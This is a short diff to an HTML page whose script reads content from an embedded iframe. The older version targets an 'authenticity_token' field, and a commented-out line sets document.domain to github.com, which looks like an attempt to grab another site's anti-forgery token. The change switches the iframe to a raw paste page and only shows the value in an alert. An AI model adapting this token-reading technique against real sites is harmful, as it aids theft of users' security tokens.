@@ -88,7 +88,7 @@ function ()
 </head>
 <body onload="">
 <div id="content"></div>
-<iframe id="iframe0"  src="https://www.pastebin.com">
+<iframe id="iframe0"  src="http://textuploader.com/d0gvs/raw">
 <script language=javascript>
 //document.domain = "github.com";
 function gettoken(){
@@ -117,7 +117,7 @@ function gettoken(){
 	function getIframeText() {
             var iframe0 = document.getElementById("iframe0");
             var iframe0document=iframe0.contentDocument||iframe0.contentWindow.document;
-            var inputIframe = iframe0document.getElementsByName("authenticity_token")[0];
+            var inputIframe = iframe0document.getElementsByTagName("pre")[0];
             alert(inputIframe.value);
         }
 	getIframeText();
